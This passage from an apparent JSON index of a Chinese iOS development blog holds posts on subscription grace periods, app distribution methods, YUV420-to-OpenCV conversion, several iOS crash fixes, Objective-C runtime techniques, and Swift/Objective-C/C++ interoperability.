Period）。开发者可以自己选择是否开启这个特性，开启后，用户的自动订阅失效后会进入一定时间的缓冲期，苹果建议你在这段时间内保持对用户的服务（比如维持用户的会员状态），因为在这段时间里苹果可能还在持续地进行续费尝试。开启的步骤也很简单：\n\n1.  在 App Store Connect 中选择开启服务；\n\n2.  在收据验证接口`/verifyReceipt`中，会有一新字段`grace_period_expires_date`，说明缓冲截止期；\n\n3.  在截止日期前，保持相应服务不中断。\n\n开启新账单缓冲期，可以减少对用户服务的干扰，账单可以维持在同一生命周期内，那么缓冲期也会算入长期订阅的 85/15 分成的时长中，从而给我们带来附加的收入，苹果强烈建议我们开启这个功能。\n\n此外，你还可以利用这段时间在应用内为用户提供“最后的温存”，比如提醒用户你的会员你已经过期，但我对你的服务目前还会一如既往！用户极有可能在这段时间里被你挽回，重新安排上会员！\n\n## 参考资料\n* [WWDC 2019 Session 302: In-App Purchases and Using Server-to-Server Notifications](https://developer.apple.com/videos/play/wwdc2019/302/)\n* [In-App Purchase Programming Guide](https://developer.apple.com/library/archive/documentation/NetworkingInternet/Conceptual/StoreKitGuide/Chapters/Subscriptions.html#//apple_ref/doc/uid/TP40008267-CH7-SW13)\n* [Receipt Validation Programming Guide](https://developer.apple.com/library/archive/releasenotes/General/ValidateAppStoreReceipt/Introduction.html#//apple_ref/doc/uid/TP40010573-CH105-SW1)\n* [In-App Purchase documents](https://developer.apple.com/documentation/storekit/in-app_purchase?language=objc)\n* [内购新特性以及使用 server-to-server 通知](https://xiaozhuanlan.com/topic/0673452981)\n","tags":["WWDC"]},{"title":"WWDC 2019 Section 304 -- App Distribution – From Ad-hoc to Enterprise","url":"/2019/07/25/WWDC 2019 Section 304- App Distribution – From Ad-hoc to Enterprise/","content":"## Overview\n\n一个应用的诞生大致经过以下历程：\n\n> (Idea)想法诞生 --> (Prototype)原型设计 --> (App)应用实体 --> (Users)用户使用\n\n你为了解决某个问题而产生想法，设计了应用的基本样式和页面交互等，然后把原型转换成真正的App，最后给用户使用，本 section 聚焦在最后一个环节，结合应用发布的四个途径，描述如何用最合适的方法将开发好的应用交付到用户使用。\n\n## Distribution Methods\n\n应用发布总共有四种途径：`Ad Hoc`、`App Store`、`In-House`、`Custom Apps`\n\n![distribution_methods.png](https://upload-images.jianshu.io/upload_images/4881420-47ffa9df422f9dc1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n关于途径的选择，你需要考虑很多问题。应用的受众是谁？谁会购买你的应用？应用的归属是谁？应用发布面向的设备是谁持有的？源码的所有权属于谁？编译应用的工作谁负责？需要开发者账号的是谁？归根结底，就是需要明确应用的使用者是谁。\n\n![user.png](https://upload-images.jianshu.io/upload_images/4881420-58b0e23578a64848.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n苹果将应用的使用者归类为个人用户和群体用户，面向个人的用户可以选择 `Ad Hoc` 和 `App Store`，其中 `Ad Hoc` 是受限制的私有途径，主要限制了使用者数量和设备，而 `App Store` 则是四种途径中唯一一个公开的应用发布途径，面向所有个人用户，因此需要经过苹果严格的审核才得以发布。面向群体用户，比方说是一个企业里的员工，可以选择 `In-House` 和 `Custom Apps` 的方式发布应用，这两种都是私有的途径。在不同阶段的应用发布可能需要选择不同途径，这就需要你明白应用的预期效果和最优方案，选择最合适你的应用使用场景的途径。在这里苹果通过一个真实的应用例子讲述选择不同途径的情况。\n\n### Ad Hoc Distribution\n\n在完成 App 开发，准备进行发布之前，我们都希望 App 能在周围的同事之间先进行测试，提提意见，修改完善之后再发布到 `App Store` 上。另外，我们应用可能使用了类似 `CloudKit`、`APNS` 等不能通过调试测试的功能，但是又希望能测试到这些功能。Apple 考虑到这些问题，通过 `Ad Hoc` 来实现发布前的用户测试。使用 `Ad Hoc` 发布非常简单，配置好 `Ad Hoc` 证书后打包导出ipa，就可以给别人安装了。但是使用 `Ad Hoc` 是有限制的，使用 App 的设备需要在开发者账号上注册，一个账号每年最多只能注册100台设备。关于 `Ad Hoc` 的要点大致如下：\n\n*   用于在已注册的设备上进行测试；\n*   短期发布的解决方案；\n*   发布的应用不可长期使用，过期后将无法使用；\n*   设备限制每年都会重置一次；\n\n随着测试的规模扩大，`Ad Hoc` 发布的方法将不能满足需求，一方面是手动添加设备UDID的过程比较耗费时间，另一方面测试设备数量的限制也会限制测试规模的扩大。这时候可以使用 `TestFlight` 来扩大 Beta 测试的规模。\n\n![testflight.png](https://upload-images.jianshu.io/upload_images/4881420-9845857f683a1148.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n`TestFlight` 有分内部测试（Internal Testing）和外部测试（External Testing），内部测试 app 不需要经过审核，只要上传即可，但是只能邀请被添加到团队的成员参加，而且最多只能添加25人。而公测是需要审核的，不过只需要知道对方的邮箱即可发送邀请，而且最多可以邀请10000人。`TestFlight` 发布的一个版本有效期最多只有90天。\n\n### Submitting to App Store\n\n在完成 Beta 测试后，你对 App 提炼出符合更多用户使用的特性，接下来可以准备宣传的资料、演示视频等，就可以准备上架 `App Store`，向外发布你的应用了。 `App Store` 上架的应用面向你选择的商店的所有用户，应用的审核和管理由 Apple 完成，因此你需要了解并遵循 `App Store` 的审核准则，确保你的应用适合大众使用，并不断更新应用以适配新的设备和系统。\n\n### In-House Distribution\n\n![in_house.png](https://upload-images.jianshu.io/upload_images/4881420-49703b125353def7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n针对企业内部应用，Apple 提供了 `In-House Distribution` 途径，让你可以完全控制应用发布的整个流程。企业自身拥有并维护应用的源码，不需要上传到 App Store，借助移动设备管理系统（MDM），就可以完全在企业内部完成应用开发到发布使用的整个过程。\n\n`In-House` 发布方式要求应用的使用者都是企业内部人员，使用 `In-House` 发布的应用要求设备可以联网，所以无法连接外网的设备可能无法使用。因为应用整个流程都是企业掌控，不能依托 `TestFlight`等工具，所以对于应用的测试和管理需要企业自行处理好。`In-House` 所使用的发布证书需要妥善保管，证书有效期只有三年，`Provision Profile` 有效期只有一年，所以要管理好证书生命周期，及时发布证书更新的应用版本，以免出现过期等情况导致应用失效。如果需要出于某些原因需要撤销证书，那么使用该证书发布的应用会马上失效，企业需要重新签名和发布应用，否则会可能出现非常糟糕的情况。\n\n### Custom Apps\n\n`Custom Apps` 也是私有的发布途径，主要使用于企业对企业提供定制化的应用服务，负责开发的一方可以在不提供源码的情况下直接提供可购买的 App 给请求开发的一方使用。另外还可以是企业为自己提供，应用可由企业自己开发并在自己的账号上发布。\n\n`Custom Apps` 属于苹果开发者计划（Apple Developer Program）的一部分，依托 `Apple Business Manager` 进行管理。此前 `Custom Apps` 只可用于企业为企业提供定制化应用服务，现在也可以像 `In-House` 那样企业为自己提供服务，你可以给你的合作伙伴、客户、加盟商、内部员工、分公司等提供应用，通过 MDM 或兑现码分发许可证。\n\n`Custom Apps` 可在一个平台上管理内部和外部的所有应用，发布的应用没有使用期限，不用担心过期的问题。`In-House` 发布的应用只能提供给企业内部员工使用，而 `Custom Apps` 则可以提供给分公司等更多人一起使用。 `Custom Apps` 本身设定是企业对企业提供服务，因此对于寻求第三方软件服务支持的企业来说，他们无需访问源码就可以获得已发布好的应用，也不需要对应用的二进制包进行重签名等操作。另外，你可以使用 `App Store` 提供的不断更新的基础设施服务，比如说支付系统、`App Thining`、`TestFlight` 和 `App Store Connect` 工具等特性。\n\n`Custom Apps` 要求购买应用的用户需要有一个 `Apple Businsess Manager` 账号，应用需要支持和适配好其选择发布的国家，最好支持所有的国家。如果使用兑换码购买应用，需要确保兑换码只会给到特定的用户，因为兑换码只能在对应企业内可用。`Custom Apps` 需要经过审核，审核要求可以访问应用所有的功能，审核通过发布后，不能再提交到 `App Store` 作为公开应用。\n\n![custom_apps.png](https://upload-images.jianshu.io/upload_images/4881420-0392d6d8167db2b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\nApple 在此环节还描述了如何使用 `Custom Apps` 发布应用，以及出现问题后解决的几个思路，详情可见视频或官方文档。\n\n## Summary\n\n综上所述，关于选择途径，主要是根据应用的使用者是对外还是内部进行选择，`Ad Hoc` 可供内部测试时发布使用，`App Store` 用于对公众发布，`In-House` 和 `Custom Apps` 用于私有应用发布使用。`Ad Hoc` 途径一般只适用于 Beta 测试，针对发布正式应用的途径选择，Apple 总结成一下表格：\n\n| 使用场景 | App Store | In-House | Custom Apps |\n| --- | --- | --- | --- |\n| 面向公众 | ☑️ |  |  |\n| 不愿向企业提供知识产权 | ☑️ |  | ☑️ |\n| 企业没有 MDM |  |  | ☑️ |\n| 被雇佣作为应用开发顾问 | ☑️ |  | ☑️ |\n| 企业没有使用 Apple Business Manager |  | ☑️ |  |\n| App 只面向内部员工 |  | ☑️ | ☑️ |\n| 为自己的企业发布应用 |  | ☑️ | ☑️ |\n\n> Apps are like cannonballs, it is better to know where they are going before they deploy.\n\nApple 希望你的应用可以用最明智的方式发布应用，这就需要你考虑清楚你的客户和用户是谁、合理分配对应版本的应用、知道并了解苹果应用审核的准则，从而选出最合适的发布途径。\n\n## Section Video\n[WWDC 2019 Section 304: App Distribution – From Ad-hoc to Enterprise](https://developer.apple.com/videos/play/wwdc2019/304/)\n","tags":["WWDC"]},{"title":"YUV420 图像旋转以及转换成 cv::Mat 方法","url":"/2019/06/12/YUV420 图像旋转以及转换成 opencv Mat 方法/","content":"\n### 旋转\n\n```\n// rotateConstant: 0 - 0°，1 - 90°，2 - 180°，3 - 270°\n- (CVPixelBufferRef)rotateBuffer:(CVPixelBufferRef)imageBuffer withConstant:(uint8_t)rotationConstant {\n    vImage_Error err = kvImageNoError;\n    CVPixelBufferLockBaseAddress(imageBuffer, 0);\n    size_t width = CVPixelBufferGetWidth(imageBuffer);\n    size_t height = CVPixelBufferGetHeight(imageBuffer);\n    size_t outHeight = width;\n    size_t outWidth = height;\n\n    assert(CVPixelBufferGetPixelFormatType(imageBuffer) == kCVPixelFormatType_420YpCbCr8BiPlanarFullRange);\n    assert(CVPixelBufferGetPlaneCount(imageBuffer) == 2); \n\n\n    // create buffer\n    CVPixelBufferRef rotatedBuffer = NULL;\n    CVPixelBufferCreate(kCFAllocatorDefault, outWidth, outHeight, kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, NULL, &rotatedBuffer);\n    CVPixelBufferLockBaseAddress(rotatedBuffer, 0);\n\n    // rotate Y plane\n    vImage_Buffer originalYBuffer = { CVPixelBufferGetBaseAddressOfPlane(imageBuffer, 0), CVPixelBufferGetHeightOfPlane(imageBuffer, 0),\n        CVPixelBufferGetWidthOfPlane(imageBuffer, 0), CVPixelBufferGetBytesPerRowOfPlane(imageBuffer, 0) };\n    vImage_Buffer rotatedYBuffer = { CVPixelBufferGetBaseAddressOfPlane(rotatedBuffer, 0), CVPixelBufferGetHeightOfPlane(rotatedBuffer, 0),\n        CVPixelBufferGetWidthOfPlane(rotatedBuffer, 0), CVPixelBufferGetBytesPerRowOfPlane(rotatedBuffer, 0) };\n    err = vImageRotate90_Planar8(&originalYBuffer, &rotatedYBuffer, rotationConstant, 0.0, kvImageNoFlags);\n\n    // rotate UV plane\n    vImage_Buffer originalUVBuffer = { CVPixelBufferGetBaseAddressOfPlane(imageBuffer, 1), CVPixelBufferGetHeightOfPlane(imageBuffer, 1),\n        CVPixelBufferGetWidthOfPlane(imageBuffer, 1), CVPixelBufferGetBytesPerRowOfPlane(imageBuffer, 1) };\n    vImage_Buffer rotatedUVBuffer = { CVPixelBufferGetBaseAddressOfPlane(rotatedBuffer, 1), CVPixelBufferGetHeightOfPlane(rotatedBuffer, 1),\n    CVPixelBufferGetWidthOfPlane(rotatedBuffer, 1), CVPixelBufferGetBytesPerRowOfPlane(rotatedBuffer, 1) };\n    err = vImageRotate90_Planar16U(&originalUVBuffer, &rotatedUVBuffer, rotationConstant, 0.0, kvImageNoFlags);\n\n    CVPixelBufferUnlockBaseAddress(imageBuffer, 0);\n    CVPixelBufferUnlockBaseAddress(rotatedBuffer, 0);\n\n    return rotatedBuffer;\n}\n\n```\n\n### 转换为 cv::Mat 格式\n\n```\n+ (Mat)matFromImageBuffer: (CVPixelBufferRef)pixelBuffer {\n    CVPixelBufferLockBaseAddress(pixelBuffer, 0);\n    \n    void *baseaddress = CVPixelBufferGetBaseAddressOfPlane(pixelBuffer, 0);\n    int bufferWidth = (int)CVPixelBufferGetWidthOfPlane(pixelBuffer,0);\n    int bufferHeight = (int)CVPixelBufferGetHeightOfPlane(pixelBuffer, 0);\n\n    cv::Mat converted;\n\n    // Get the yPlane (Luma values)\n    cv::Mat yPlane = cv::Mat(bufferHeight, bufferWidth, CV_8UC1, baseaddress);\n\n    // Get cbcrPlane (Chroma values)\n    int cbcrWidth = (int)CVPixelBufferGetWidthOfPlane(pixelBuffer,1);\n    int cbcrHeight = (int)CVPixelBufferGetHeightOfPlane(pixelBuffer, 1);\n    void *cbcrAddress = CVPixelBufferGetBaseAddressOfPlane(pixelBuffer, 1);\n    // Since the CbCr Values are alternating we have 2 channels: Cb and Cr. Thus we need to use CV_8UC2 here.\n    cv::Mat cbcrPlane = cv::Mat(cbcrHeight, cbcrWidth, CV_8UC2, cbcrAddress);\n\n    // Split them apart so we can merge them with the luma values\n    std::vector<cv::Mat> cbcrPlanes;\n    cv::split(cbcrPlane, cbcrPlanes);\n\n    cv::Mat cbPlane;\n    cv::Mat crPlane;\n\n    // Since we have a 4:2:0 format, cb and cr values are only present for each 2x2 luma pixels. Thus we need to enlargen them (by a factor of 2).\n    cv::resize(cbcrPlanes[0], cbPlane, yPlane.size(), 0, 0, cv::INTER_NEAREST);\n    cv::resize(cbcrPlanes[1], crPlane, yPlane.size(), 0, 0, cv::INTER_NEAREST);\n\n    cv::Mat ycbcr;\n    std::vector<cv::Mat> allPlanes = {yPlane, cbPlane, crPlane};\n    cv::merge(allPlanes, ycbcr);\n\n    // ycbcr now contains all three planes. We need to convert it from YCbCr to BGR so OpenCV can work with it\n    cv::cvtColor(ycbcr, converted, cv::COLOR_YCrCb2BGR);\n\n    CVPixelBufferUnlockBaseAddress(pixelBuffer, 0);\n    \n    return converted;\n}\n```","tags":["Tips"]},{"title":"【Crash】 WKWebView 设置 UIScrollViewDelegate","url":"/2019/05/20/iOS 9 WKWebView 设置UIScrollViewDelegate崩溃问题/","content":"\n### 问题描述\n系统要求：iOS 9.x 及之前版本\n设备要求：无\n问题详情：使用WKWebView时，设置了scrollView的delegate，但是在关闭页面时没有设回nil，在webView的dealloc时就会崩溃。\n```\n_webView.scrollView.delegate = self;\n```\n### 崩溃日志\n问题关键堆栈信息\n```\n- [UIScrollView setDelegate:] + 40\n- [WKScrollView _updateDelegate] + 228\n- [WKWebView dealloc] + 216\n```\n### 原因分析\nWebKit的bug，因为时iOS 9 及之前版本，初步估计是苹果对于`delegate`的处理没有达到`weak`的预期情况，导致在退出当前`ViewController`的时候更新webView的`delegate`，还是使用了已经释放的`ViewController`。\n在iOS 10苹果已经把问题修复了。\n### 解决方案\n在页面关闭时，或者页面dealloc时，把scrollView的delegate设回nil。\n```\n_webView.scrollView.delegate = nil;\n```","tags":["Crash"]},{"title":"iOS runtime 常用功能整理","url":"/2019/05/16/iOS runtime常用功能整理/","content":"\n##  修改变量值\n用runtime方法修改变量值，相当于赋值语句，主要原理是遍历类的IvarList，找到名字相同的实例变量，然后修改其属性值。\n```\n// 获取指定名的实例变量\n- (Ivar)getIvarWithName: (const char *)ivarName {\n    unsigned int count = 0;\n    // 获取实例变量列表\n    Ivar *ivarList = class_copyIvarList(_person.class, &count);\n    // 遍历属性名\n    for (int i=0; i<count; i++) {\n        Ivar ivar = ivarList[i];\n        const char *name = ivar_getName(ivar);\n        if (strcmp(name, ivarName) == 0) {\n            // class_copyIvarList会申请内存，需要手动释放\n            free(ivarList);\n            return ivar;\n        }\n    }\n    free(ivarList);\n    return NULL;\n}\n\n// 修改变量值\nIvar name = [self getIvarWithName:\"_name\"];\nif (name != NULL) {\n    object_setIvar(_person, name, @\"new name\");\n}\n```\n## 添加属性\n常见于在category里添加属性，自定义getter和setter，因为category不是类，没有指向类的isa指针，也就没有ivar_list，即使添加属性也不会生成setter和getter的实现以及成员变量，所以只能通过关联方式添加属性。\n```\n// 添加\nconst char *key = \"age\";\nobjc_setAssociatedObject(_person, key, @\"18 years old\", OBJC_ASSOCIATION_RETAIN_NONATOMIC);\n// 获取属性\nobjc_getAssociatedObject(_person, key)\n```\n\n## 添加方法\n可用通过`class_addMethod`添加方法，主要是通过selector和imp创建一个method_t添加到类的method_list中。最后一个参数是 type encodings ，用来标识IMP函数实现的返回值与参数，具体可参考官方给出的对应表 [type encodings](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/ObjCRuntimeGuide/Articles/ocrtTypeEncodings.html)。\n```\n- (void)dynamicallyAddMethod {\n    SEL selector = @selector(tempMethod);\n    IMP imp = class_getMethodImplementation(self.class, selector);\n    const char *type = method_getTypeEncoding(class_getInstanceMethod(self.class, selector));\n    \n    // 添加方法\n    if (![_person respondsToSelector:selector]) {\n        class_addMethod(_person.class, selector, imp, type);\n    }\n    if ([_person respondsToSelector:selector]) {\n        // 调用方法\n        IMP personImp = [_person methodForSelector:selector];\n        NSString *(*func)(id, SEL) = (void *)personImp;\n        NSLog(@\"%@\", func(_person, selector));\n    } else {\n        NSLog(@\"Fail to add method dynamically\");\n    }\n}\n```\n\n## 交换方法\n可以交换对象中的两个方法，还可以交换不同对象的方法\n```\n- (void)exchangeMethod {\n    NSLog(@\"Before exchanging method1 result: \");\n    [_person method1];\n    Method imp1 = class_getInstanceMethod(_person.class, @selector(method1));\n    Method imp2 = class_getInstanceMethod(self.class, @selector(methodForExchange));\n    method_exchangeImplementations(imp1, imp2);\n    NSLog(@\"After exchanging method1 result: \");\n    [_person method1];\n    // 换回去\n    method_exchangeImplementations(imp1, imp2);\n}\n```\n## 拓展功能\n主要原理还是上面的交换方法，不过拓展功能应不影响原本方法，因此在新方法中，需要调用原本方法。此功能比较常见，比如想要记录ViewController生命周期，可以另外写一个ViewController的分类，然后在`load`方法里拓展对应方法，添加自定义记录。\n```\n+ (void)load {\n    static dispatch_once_t onceToken;\n    dispatch_once(&onceToken, ^{\n        Method originMethod = class_getInstanceMethod(self.class, @selector(viewDidLoad));\n        Method extendMethod = class_getInstanceMethod(self.class, @selector(extendMethodForViewDidLoad));\n        method_exchangeImplementations(originMethod, extendMethod);\n    });\n}\n- (void)extendMethodForViewDidLoad {\n    // 进行自定义操作\n    NSLog(@\"Intercept viewDidLoad method and do something... >_>\");\n    // 调用原来的viewDidLoad\n    [self extendMethodForViewDidLoad];\n}\n```\n## 归档解档\n当我们使用 NSCoding 进行归档及解档时，我们需要对所有属性实现一遍 encodeObject 和 decodeObjectForKey 方法，如果模型里面有 10000 个属性, 那么我们就需要写 10000 次，这个时候可以用 runtime 简化操作 。（注意：自定义类型要自行转换）\n```\n- (void)encodeWithCoder:(NSCoder *)aCoder {\n    unsigned int count = 0;\n    Ivar *ivarList = class_copyIvarList(self.class, &count);\n    for (int i = 0; i < count; i ++) {\n        Ivar ivar = ivarList[i];\n        // 获取属性名\n        NSString *key = [NSString stringWithUTF8String:ivar_getName(ivar)];\n        // 根据属性名称获取对应的值\n        id value = object_getIvar(self, ivar);\n        [aCoder encodeObject:value forKey:key];\n    }\n    free(ivarList);\n}\n\n- (instancetype)initWithCoder:(NSCoder *)aDecoder {\n    if (self = [super init]) {\n        unsigned int count = 0;\n        Ivar *ivarList = class_copyIvarList(self.class, &count);\n        for (int i = 0; i < count; i ++) {\n            Ivar ivar = ivarList[i];\n            NSString *key = [NSString stringWithUTF8String:ivar_getName(ivar)];\n            // 解档取值\n            id value = [aDecoder decodeObjectForKey:key];\n            // 赋值\n            object_setIvar(self, ivar, value);\n        }\n        free(ivarList);\n    }\n    return self;\n}\n\n```\n## 模型转字典\n目前常用模型转字典第三方库，比如MJExtension、YYModel，其实现方式主要也是通过runtime的方法获取和遍历属性，然后对名称、类型、值进行转换操作。\n```\n- (void)modelToDict {\n    unsigned int count = 0;\n    NSMutableDictionary *dictionary = [NSMutableDictionary dictionary];\n    // 获取成员属性数组\n    Ivar *ivarList = class_copyIvarList(_person.class, &count);\n    // 遍历所有的成员属性名\n    for (int i = 0; i < count; i ++) {\n        // 获取成员属性\n        Ivar ivar = ivarList[i];\n        NSString *key = [[NSString stringWithUTF8String:ivar_getName(ivar)] substringFromIndex:1];\n        id value = object_getIvar(_person, ivar);\n        dictionary[key] = value;\n    }\n    free(ivarList);\n    NSLog(@\"Model to dictionary: %@\", dictionary);\n}\n```\n","tags":["Tips"]},{"title":"【Crash】手写输入崩溃 -[UIKBBlurredKeyView candidateList]","url":"/2019/05/08/iOS 11 手写输入崩溃 -[UIKBBlurredKeyView candidateList]/","content":"\n### 问题描述\n系统要求：iOS 11.2及之前版本\n设备要求：无\n问题详情：因为需要适配小屏幕设备，多个输入框的时候可能需要放在UIScorllView中。当点击其他空白处时候需要隐藏键盘。方法有很多，其中一种做法就是写一个UIScrollView的分类，把Touch事件向后传递，在UITextField所在的界面中重写Touch事件方法关闭键盘。\n```\n@implementation UIScrollView (Touch)\n\n- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event {\n    [[self nextResponder] touchesBegan:touches withEvent:event];\n    [super touchesBegan:touches withEvent:event];\n}\n\n@end\n```\n然后用手写输入法写了一个字后，候选词的位置变灰色，一点就崩溃。\n\n### 崩溃日志\n![crash log1](https://upload-images.jianshu.io/upload_images/4881420-be6dbbc6013d4fda.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n![crash log2](https://upload-images.jianshu.io/upload_images/4881420-beb1736269bb8867.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n问题关键信息：\n```\n-[UIKBBlurredKeyView candidateList]: unrecognized selector sent to instance\n```\n\n### 原因分析\n点击手写板的候选词区域(`UIKBCandidateCollectionView`)时，同样执行了上面的代码，然后事件响应向上传递，但这个view的`nextResponder`是`UIKBHandwritingCandidateView`类的实例。执行它的`touchesBegan:withEvent:`方法后，会使得整个候选词区域呈选中状态，本应调用`UIKBCandidateView`实例的方法`candidateList`，结果调用了`UIKBBlurredKeyView`的`candidateList方法`，导致方法找不到，导致`-[UIKBBlurredKeyView candidateList]: unrecognized selector sent to instance `的崩溃。\n\n### 解决方案\n* 方案一：\n在`touchesBegan`方法里对不同的类进行类型判断，只对UIScrollView做响应:\n```\n- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event {\n    if ([self isMemberOfClass:[UIScrollView class]]) {\n        [[self nextResponder] touchesBegan:touches withEvent:event];\n    }\n    [super touchesBegan:touches withEvent:event];\n}\n```\n* 方案二：\n使用`UITapGestureRecognizer`类，进行用户的点击事件拦截，且要将tap的`cancelsTouchesInView`属性设置为`NO`，否则会屏蔽到当前view的点击事件。","tags":["Crash"]},{"title":"【Crash】 PhotoKit--This application is not allowd to access Photo data","url":"/2019/05/07/PhotoKit crash -- This application is not allowed to access Photo data/","content":"\n### 问题描述\n系统要求：无\n设备要求：无\n问题详情：用户禁止应用访问相册，但应用仍然调用了`-[PHImageManager defaultManager]`方法，当应用出现内存警告时，就会崩溃。\n### 崩溃信息\n这个问题的崩溃日志：\n![crash log](https://upload-images.jianshu.io/upload_images/4881420-6cfa050d9f795f13.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n问题关键信息：\n```\nThis application is not allowed to access Photo data.\n```\n### 复现方法\n1.创建一个新工程，添加相册读取权限`Privacy - Photo Library Usage Description`。\n2.在`ViewDidLoad`的时候调用 `-[PHImageManager defaultManager]`。\n```\n- (void)viewDidLoad {\n    [super viewDidLoad];\n    // Do any additional setup after loading the view.\n    \n    [PHImageManager defaultManager];\n}\n```\n3. 运行工程，在申请相册访问权限时点 **Don't Allow**。\n4. 模拟内存警告，工具栏点 `Debug` -> `Simulate Memory Warning`，就会崩溃。\n![Memory warning](https://upload-images.jianshu.io/upload_images/4881420-d224958b24d810a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n\n### 原因分析\n`PHImageManager`在初始化的时候添加`DISPATCH_SOURCE_TYPE_MEMORYPRESSURE`事件通知，当内存不够的时候会尝试移除缓存。PHImageManager 是一个懒加载的对象，你如果曾经调用过 `-[PHImageManager defaultManager]` 隐式初始化，而且没获得相册权限，就会导致 crash。\n### 解决方案\n读取相册前先判断相册权限：\n```\nPHAuthorizationStatus status = [PHPhotoLibrary authorizationStatus];\nswitch (status) {\n    case PHAuthorizationStatusAuthorized:\n        // 可以读取相册\n        break;\n        \n    case PHAuthorizationStatusNotDetermined:\n        // 执行获取权限操作\n        [PHPhotoLibrary requestAuthorization:^(PHAuthorizationStatus status) {\n            if (status == PHAuthorizationStatusAuthorized) {\n                // 可以读取相册\n            } else {\n                // 提示在设置中打开相册访问权限\n            }\n        }];\n        break;\n        \n    case PHAuthorizationStatusDenied:\n        // 提示在设置中打开相册访问权限\n        break;\n        \n    case PHAuthorizationStatusRestricted:\n        // 提示访问相册受到限制，比如家长控制\n        break;\n        \n    default:\n        break;\n}\n```\n确保拥有相册权限才读取相册图片，尤其是调用`-[PHImageManager defaultManager]`。\n\n另外打开设置中当前应用设置的方法如下：\n```\n[[UIApplication sharedApplication] openURL:[NSURL URLWithString:UIApplicationOpenSettingsURLString] options:@{} completionHandler:nil];\n```","tags":["Crash"]},{"title":"Swift 与 OC 混编","url":"/2019/04/28/Swift与OC混编/","content":"\n## Swift与OC混编\n### Swift工程中调用OC代码\n不需要在Swift中import OC的类，统一在桥接文件中导入需要暴露给Swift的OC类即可在Swift中访问。具体步骤如下：\n1. 创建桥接文件：\n在Swift工程里创建OC文件，创建完成后Xcode会问你是否需要创建桥接文件，点击`Create Bridging Header`即可创建桥接文件，并设置好了文件路径。\n![auto create](https://upload-images.jianshu.io/upload_images/4881420-9c1bc1525c63eee6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n    还可以手动添加桥接文件，首先创建一个`.h`文件，命名格式为`ProductName-Bridging-Header.h`，\n![manual create](https://upload-images.jianshu.io/upload_images/4881420-e592ae41a35a9fa8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n    其中`Product Name`一般是工程名，在`Build Settings`里面可以搜索到。\n![Product Name](https://upload-images.jianshu.io/upload_images/4881420-d8ce3a226b86c96c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n  \n    创建完桥接文件之后，还需手动添加文件路径配置，在`Build Settings`->`Objective-C Bridging Header`中加入相对路径，路径起始位置就是工程文件的位置，在这里的示例是放在工程目录。\n    ![path](https://upload-images.jianshu.io/upload_images/4881420-669fce21e2eb3834.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n2. 在桥接文件中导入需要的OC类\n```\n#import \"OCTest.h\"\n```\n\n3. 使用OC类的方法\n在任意Swift文件都可以使用导入的OC类的方法，也可以是C方法：\n```\n#import \"OCTest.h\"\n\n@implementation OCTest\n\n- (void)test {\n    NSLog(@\"This is a OC test method\");\n}\n\nvoid ctest() {\n    printf(\"This is a C method\");\n}\n\n@end\n```\n和普通Swift类使用的方法一样：\n```\noverride func viewDidLoad() {\n    super.viewDidLoad()\n    // Do any additional setup after loading the view.\n        \n    OCTest().test()\n    ctest()\n}\n\n========================================\n2019-04-28 17:48:58.178346+0800 Swift5Demo[95779:2516896] This is a OC test method\nThis is a C method\n```\n### OC调用Swift代码\n1. 首先把`Build Settings` -> `Defines Module`设为`YES`\n![Defines Module](https://upload-images.jianshu.io/upload_images/4881420-2b60fc30eb947ee1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n2. 在OC工程中，添加了Swift文件后，Xcode会根据Target创建`Objective-C Generated interface Header`，即Swift转换OC下生成的接口头文件，在`Build Settings`->`Objective-C Generated interface Header Name`可以查看：\n![Objective-C Generated interface Header Name](https://upload-images.jianshu.io/upload_images/4881420-197ed03d11a5f4ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n3. 注意，Swift的类、属性或方法如果想要在OC中使用的，都需要在前面加上`@objc open`修饰符：\n```\n@objc open class SwiftTest: NSObject {\n\n    @objc open var str = \"swift param\"\n    \n    @objc open func test() {\n        print(\"This is a Swift method.\")\n    }\n}\n\n```\n\n4. 调用Swift方法\n首先引入接口头文件：\n```\n#import \"OpenDemo-Swift.h\"\n```\n然后即可调用Swift的方法：\n```\nSwiftTest *swiftTest = [[SwiftTest alloc] init];\n\nNSLog(@\"%@\", swiftTest.str);\n[swiftTest test];\n\n=========================================\n2019-04-28 17:03:51.478585+0800 OpenDemo[94511:2459635] swift param\nThis is a Swift method.\n```\n\n## Swift和C++\nSwift不能直接调用C++，但是Objective-C与C++是可以混编，而且可以使用STL，办法就是将OC的.m文件后缀改成.mm，然后在OC类中调用C++的类，封装成几个公共的方法就可以了。这时再用swift来调用OC类里的方法，就可以执行C++语句了。\n\n1. 创建C++类\n```\n#ifndef CppTest_hpp\n#define CppTest_hpp\n\n#include <stdio.h>\n\nclass Test {\npublic:\n    void test();\n};\n\n#endif\n\n---------------------------------\n\n#include \"CppTest.hpp\"\n#include <iostream>\n\nusing namespace std;\n\nvoid Test::test() {\n    cout << \"Hello world\" << endl;\n}\n\n```\n2. 创建一个OC类调用C++方法\n```\n#import \"CppTestWraper.h\"\n#import \"CppTest.hpp\"\n\nusing namespace std;\n\n@implementation CppTestWraper\n\n- (void)test {\n    Test* cppTest = new Test();\n    cppTest->test();\n    delete cppTest;\n}\n\n@end\n```\n3. Swift调用OC方法同上，最后调用：\n```\nCppTestWraper().test()\n\n============================\nHello world\n```\n\n\n","tags":["Tips"]},{"title":"iOS 架构模式之 MVP","url":"/2019/03/18/iOS架构模式之MVP/","content":"\n### 